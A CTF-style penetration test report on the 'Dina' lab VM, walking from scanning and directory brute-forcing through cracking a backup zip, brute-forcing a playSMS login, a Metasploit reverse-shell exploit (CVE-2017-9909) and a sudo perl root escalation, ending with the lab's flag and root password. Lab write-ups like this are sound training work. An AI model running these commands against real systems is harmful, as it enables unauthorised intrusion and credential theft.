# CONFIDENTIAL — Penetration Test Report
## Vulnerable Host "Dina"

**Network Penetration Test — Full Compromise Assessment, From Reconnaissance to Root**

| Field | Value |
|---|---|
| Target Host | 192.168.56.105 ("Dina") |
| Target OS | Ubuntu 12.04 LTS (Linux Kernel 3.2.0-23-generic-pae, i686) |
| Primary Service | playSMS v1.4 (Apache/2.2.22, PHP 5.3.10) |
| Attacking Host | Kali Linux (192.168.56.103) |
| Engagement Type | Black-Box CTF-Style Penetration Test |
| Final Result | Full Root Compromise — Flag Captured |
| Report Date | October 13, 2026 |

---

## Task Overview

**Objective:** Perform a complete, end-to-end penetration test against "Dina" to identify exposed services, discover and exploit vulnerabilities in the hosted web application, escalate privileges to root, and retrieve the proof-of-compromise flag.

**Methodology:**
- **Reconnaissance** — host discovery, port scanning and service fingerprinting.
- **Web Enumeration** — directory brute-forcing, source review and hidden file discovery.
- **Credential Access** — recovering and cracking a password-protected backup archive, followed by online brute-forcing of the discovered application login.
- **Exploitation** — weaponising a known authenticated remote code execution vulnerability in the identified application version (playSMS 1.4 / CVE-2017-9909) to obtain an initial foothold.
- **Post-Exploitation & Privilege Escalation** — enumerating the compromised host for misconfigurations and abusing an insecure sudo rule to escalate from `www-data` to root.
- **Proof of Compromise** — capturing the root-level flag and credentials to confirm full system takeover.

**Tools Used:** `ip`/`ip route`, `arp-scan`, Nmap, cURL, Gobuster, 7-Zip (`7z`), Python 3 (brute-forcer), Firefox, `searchsploit`/Exploit-DB, Metasploit Framework, Meterpreter, GTFOBins (sudo/perl)

---

## Proof of Concept

### Phase 1 — Reconnaissance & Network Discovery

**Step 1 — Identify Attacker Network Interface**
```bash
$ ip a
```
Attacker (Kali) network interfaces identified — host-only adapter eth1 on 192.168.56.103/24.

**Step 2 — Host Discovery & Port/Service Scanning**
```bash
$ ip route
$ sudo arp-scan --interface=eth1 --localnet
$ nmap -sV 192.168.56.100 192.168.56.105
```
ARP scan reveals live hosts on the subnet; Nmap service scan confirms 192.168.56.105 is running Apache/2.2.22 (Ubuntu) on port 80.

**Step 3 — Full Port & Script Scan**
```bash
$ sudo nmap -sC -sV -p- 192.168.56.105
$ curl http://192.168.56.105/robots.txt
$ curl -i http://192.168.56.105/angel1/
```
Full TCP port scan confirms only port 80/tcp open, hostname 'Dina', and reveals 5 disallowed entries in `robots.txt`. `robots.txt` is then queried directly and the disclosed `/angel1/` path is browsed, returning a directory listing.

### Phase 2 — Web Application Enumeration

**Step 4 — Browse the Web Root**
```bash
$ curl http://192.168.56.105
```
Default landing page of the target ('Dina 1.0 — Angel of Learning'), authored by Touhid Shaikh — confirms the box owner's identity.

**Step 5 — Manual Directory Probing**
```bash
$ curl -I http://192.168.56.105/angel/
$ curl -i http://192.168.56.105/angel1/
```
`/angel/` returns 404, but `/angel1/` returns 200 OK with a directory listing — first hidden directory discovered.

**Step 6 — Follow Disclosed Paths — Password Hints Leaked**
```bash
$ curl -iL http://192.168.56.105/nothing
$ curl -i http://192.168.56.105/tmp/
```
The `/nothing` endpoint leaks an HTML comment containing a list of candidate passwords: `freedom`, `password`, `helloworld!`, `diana`, `iloveroot`.

**Step 7 — Explore Open Directories (/uploads, /tmp)**
```bash
$ curl -i http://192.168.56.105/uploads/
$ gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
```
`/uploads/` is browsable but empty; Gobuster directory brute-force launched against the web root using the common.txt wordlist.

**Step 8 — Directory Brute-Force Results**
```bash
$ gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
```
Gobuster uncovers `/secure/`, `/tmp/` and `/uploads/`. Browsing `/secure/` reveals a downloadable file: `backup.zip`.

### Phase 3 — Credential Recovery

**Step 9 — Download & Attempt to Extract the Backup Archive**
```bash
$ 7z t -p'freedom' backup.zip
$ 7z x backup.zip
```
`backup.zip` is downloaded and found to be password-protected; an initial extraction attempt without the correct password fails.

**Step 10 — Crack the Archive & Recover the Credential Note**
```bash
$ 7z x -p'freedom' backup.zip
$ file backup-cred.mp3
$ cat backup-cred.mp3
```
Using the leaked candidate password `freedom`, the archive is successfully extracted. The disguised file `backup-cred.mp3` is actually ASCII text revealing username `touhid` and the hidden login path `/SecreTSMSgatwayLogin`.

### Phase 4 — Application Login Discovery

**Step 11 — Identify the playSMS Login Portal & Form Fields**
```bash
$ curl -sL http://192.168.56.105/SecreTSMSgatwayLogin/ | head -n 25
$ curl -sL ... | grep -iE 'forgot|recover|password|username|login'
```
The hidden path serves a playSMS login portal. HTML source reveals the login form field names: `username` and `password`.

**Step 12 — Inspect CSRF Token Behaviour**
```bash
$ curl -s '.../core_auth&route=login' | grep CSRF   (run twice)
```
The login form embeds a per-request `X-CSRF-Token`, confirming the token is session-bound and must be fetched fresh for every login attempt.

### Phase 5 — Credential Brute-Force

**Step 13 — Prepare Wordlist & Custom Python Brute-Forcer**
```bash
$ ls /usr/share/wordlists/
$ wc -l rockyou.txt
$ head -n 5000 rockyou.txt > quick.txt
$ python3 brute1.py
```
A Python script is written to fetch a fresh CSRF token and session cookie per attempt, then POST each candidate password from a 5,000-entry rockyou-derived wordlist against the login endpoint.

**Step 14 — Successful Credential Brute-Force**
```bash
$ python3 brute1.py
```
The brute-force script iterates through common passwords and successfully identifies the valid credential pair: **`touhid` / `diana`**.

### Phase 6 — Login Validation

**Step 15 — Validate Credentials via the playSMS Web Login**
```
Browser: http://192.168.56.105/SecreTSMSgatwayLogin/
```
Credentials `touhid` / `diana` are submitted through the actual login form in Firefox to confirm they are valid. Successful authentication confirmed — the playSMS dashboard loads as user 'touhid'.

### Phase 7 — Vulnerability Identification

**Step 16 — Identify the playSMS Version & Search for Public Exploits**
```bash
$ searchsploit playsms
```
searchsploit reveals multiple known playSMS vulnerabilities, including a Metasploit-ready authenticated RCE for playSMS 1.4 via `sendfromfile.php` (CVE-2017-9909).

**Step 17 — Locate the Matching Metasploit Module**
```bash
$ msfconsole
$ search playsms
```
Metasploit confirms module `exploit/multi/http/playsms_filename_exec` — an authenticated "Filename" field code execution exploit matching playSMS 1.4.

### Phase 8 — Exploitation (CVE-2017-9909)

**Step 18 — Load the Exploit Module & Review Required Options**
```bash
$ use exploit/multi/http/playsms_filename_exec
$ show options
```
The exploit module is loaded; required options include RHOSTS, TARGETURI, USERNAME, PASSWORD and the reverse TCP payload LHOST/LPORT.

**Step 19 — Configure Exploit Options**
```bash
$ set RHOSTS 192.168.56.105
$ set TARGETURI /SecreTSMSgatwayLogin/
$ set USERNAME touhid
$ set PASSWORD diana
$ set LHOST 192.168.56.103
```
All exploit and payload options are correctly configured and verified with `show options` prior to launch.

**Step 20 — Launch the Exploit & Obtain Initial Shell**
```bash
$ run
```
Authentication succeeds, the payload stage is delivered, and a Meterpreter session opens — the server username is confirmed as `www-data`.

### Phase 9 — Post-Exploitation Enumeration

**Step 21 — Enumerate the Compromised Host**
```bash
$ sysinfo
$ pwd
$ ls /home
$ background
```
Host confirmed as Ubuntu 12.04 (kernel 3.2.0-23, i686), hostname Dina. A local user 'touhid' is identified under `/home`.

**Step 22 — Search for Applicable Kernel Exploits**
```bash
$ search type:exploit platform:linux kernel
$ search dirtycow
```
Metasploit's local kernel exploit modules are reviewed as a potential privilege escalation path for this older kernel. No Linux-compatible Dirty COW module is available in this Metasploit build, prompting a safer, configuration-based privilege escalation approach instead.

### Phase 10 — Privilege Escalation

**Step 23 — Enumerate SUID Binaries & Sudo Rights**
```bash
$ execute -f /bin/sh -i -H -c
$ find / -perm -4000 -type f 2>/dev/null
$ sudo -l
```
`sudo -l` reveals a critical misconfiguration: user `www-data` may run `/usr/bin/perl` as root with NOPASSWD — a direct privilege escalation vector (GTFOBins).

**Step 24 — Confirm the Misconfiguration & Prepare Escalation**
```bash
$ ls -la /home/touhid
$ sudo perl -e 'exec "/bin/sh";'
```
Home directory of touhid is enumerated for additional artefacts, and the Perl-based sudo escalation command is issued.

### Phase 11 — Root Access & Flag Capture

**Step 25 — Confirm Root Access**
```bash
$ id
$ cat /root/root.txt
$ ls -la /root
```
`id` confirms `uid=0(root)` — full root access obtained. `/root` is enumerated and `flag.txt` is located.

**Step 26 — Capture the Root Flag & Credentials**
```bash
$ find / -iname '*flag*' 2>/dev/null
$ cat /root/flag.txt
```
The root flag file is located and read, disclosing the root password (`hello@3210`) and the final flag: `22d06624cd604a0626eb5a2992a6f2e6`.

---

## Findings Summary

| # | Finding | Severity |
|---|---|---|
| 1 | Sensitive information disclosure via robots.txt-referenced pages leaking candidate passwords | MEDIUM |
| 2 | Weak, password-protected backup archive containing plaintext credential hints | HIGH |
| 3 | Weak playSMS application password, vulnerable to online brute-force | HIGH |
| 4 | Outdated playSMS 1.4 installation vulnerable to authenticated RCE (CVE-2017-9909) | **CRITICAL** |
| 5 | Insecure sudo configuration allowing `www-data` to run `/usr/bin/perl` as root with NOPASSWD | **CRITICAL** |

---

## Conclusion

The penetration test against the "Dina" host (192.168.56.105) resulted in full compromise of the system, progressing from unauthenticated network reconnaissance all the way to root-level access.

The attack chain relied on a combination of information disclosure (leaked password hints and a weakly protected backup archive), a weak application-level password, and a critical, publicly known remote code execution vulnerability in playSMS 1.4 (CVE-2017-9909). Post-exploitation enumeration uncovered a severe sudo misconfiguration that allowed trivial escalation from the low-privileged `www-data` account directly to root.

This engagement illustrates how several individually moderate weaknesses — weak secrets management, outdated software, and permissive sudo rules — can be chained together into a complete system takeover.

**Root Flag:** `22d06624cd604a0626eb5a2992a6f2e6`
**Root Password:** `hello@3210`

---

*Prepared by Lubna Banu — End of report, prepared for authorized CTF / lab use only.*
